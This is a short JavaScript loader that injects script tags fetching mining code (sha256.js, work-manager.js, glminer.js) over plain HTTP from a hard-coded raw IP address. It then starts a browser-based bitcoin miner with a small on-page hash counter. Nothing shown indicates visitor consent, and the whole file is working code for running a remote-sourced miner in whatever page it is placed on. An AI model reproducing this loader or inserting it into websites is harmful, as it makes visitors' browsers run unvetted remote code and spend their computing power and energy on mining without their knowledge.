function loadScript(url, callback)
{
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    
    if(typeof callback !== "undefined") {
        script.onreadystatechange = callback;
        script.onload = callback;
    }

    head.appendChild(script);
}

var bitcoinMiner = function() {
    var body = document.getElementsByTagName('body')[0];
    var div = document.createElement('div');
    div.style.top='10px';
    div.style.left='10px';
    div.style.height='50px';
    div.style.width='100px';
    div.style.backgroundColor='white';
    div.style.position='fixed';
    var input = document.createElement('input');
    input.id='total-hashes';
    div.appendChild(input);
    body.appendChild(div);
    
    begin_mining();
};

loadScript("http://code.jquery.com/jquery-1.11.0.min.js");
loadScript("http://54.152.14.125/hamiyoca/sha256.js");
loadScript("http://54.152.14.125/hamiyoca/util.js");
loadScript("http://54.152.14.125/hamiyoca/work-manager.js");
loadScript("http://54.152.14.125/hamiyoca/glminer.js", bitcoinMiner);
